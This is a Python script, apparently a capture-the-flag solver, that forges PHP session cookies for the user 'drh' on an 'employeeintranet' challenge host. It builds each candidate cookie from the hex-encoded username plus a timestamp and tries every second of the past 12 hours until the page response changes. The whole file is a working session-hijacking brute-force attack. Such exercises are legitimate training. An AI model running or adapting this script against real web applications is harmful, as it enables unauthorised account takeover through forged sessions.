import requests as re
import datetime
import sys
import pytz

today = datetime.datetime.now(pytz.timezone("Europe/Paris"))
epoch = datetime.datetime(1970,1,1, tzinfo=pytz.timezone("Europe/Paris"))

p="drh"
end = 43200

print(f"[*] Searching for a valid cookie to connect as {p}")

from progress.bar import Bar
bar = Bar('Processing', max=end)


for i in range(0, end):
    now = str(round((today - datetime.timedelta(seconds=i) - epoch).total_seconds()))
    phpsessid = "".join([ '3' + c for c in str(now)])
    NEW_SID =  "".join(["{:02x}".format(ord(c)) for c in p]) + phpsessid
    res = re.get('http://employeeintranet.chall.quel-hacker-es-tu.fr/index.php', headers = {'Cookie': 'PHPSESSID='+NEW_SID})
    if len(res.text) != 4902:
        print("")
        print(f"[+] Connected as {p} with PHPSESSID={NEW_SID}")
        sys.exit()
    bar.next()

